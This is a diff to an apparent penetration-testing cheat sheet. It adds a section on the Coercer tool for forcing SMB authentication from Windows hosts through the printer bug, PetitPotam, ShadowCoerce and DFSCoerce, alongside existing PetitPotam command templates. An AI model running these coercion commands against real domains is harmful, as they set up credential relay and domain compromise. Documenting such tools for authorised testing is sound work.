@@ -473,6 +473,20 @@ PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -k -no-pass <LISTENING_HOST> <TARGET
 PetitPotam.py -pipe <efsr | lsarpc | samr | netlogon | lsass> -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <LISTENING_HOST> <TARGETED_HOST>
 ```
 
+### Automated coercing using various techniques with Coercer
+
+The [`Coercer`](https://github.com/p0dalirius/Coercer) Python utility can be
+used to coerce `SMB` authentication using a number of functions on different
+`RPC` interfaces:
+  - `MS-RPRN` "printer bug"
+  - `MS-EFSR` PetitPotam
+  - `MS-FSRVP` ShadowCoerce
+  - `MS-DFSNM` DFSCoerce
+
+```
+coercer.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' -l <LISTENER_IP | LISTENER_HOSTNAME> [-t <TARGET_IP | TARGET_HOSTNAME> | -f <TARGETS_FILE>]
+```
+
 --------------------------------------------------------------------------------
 
 ### References
